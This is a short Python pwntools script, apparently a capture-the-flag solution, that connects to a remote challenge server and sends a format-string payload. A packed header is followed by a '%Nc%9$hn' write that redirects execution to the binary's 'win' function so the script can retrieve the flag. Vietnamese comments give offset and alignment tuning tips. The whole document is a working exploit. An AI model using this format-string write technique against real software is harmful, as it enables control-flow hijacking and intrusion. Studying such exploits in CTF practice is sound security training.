#!/usr/bin/env python3
from pwn import *

PORT = 8929
HOST = "nc.umbccd.net"

exe = ELF('./out', checksec=False)
p = remote(HOST, PORT)

MAGIC = 0x564D576E
WIN = exe.sym.win

# Mẹo căn chỉnh Stack: Nếu -7 không hoạt động, hãy thử đổi ALIGN_OFFSET thành 1 hoặc 5
ALIGN_OFFSET = 0 
target_val = (WIN & 0xffff) - 7 + ALIGN_OFFSET

# Offset 9 đã chuẩn trên local, hy vọng remote chung bản Ubuntu
OFFSET = 9 
fmt = f"%{target_val}c%{OFFSET}$hn".encode()

head = struct.pack("<III", MAGIC, len(fmt), 0)
pl = head + fmt

p.send(pl) 

# Thu thập toàn bộ log và flag trước khi server ngắt kết nối
try:
    print(p.recvall(timeout=3).decode())
except Exception as e:
    print(f"Error receiving data: {e}")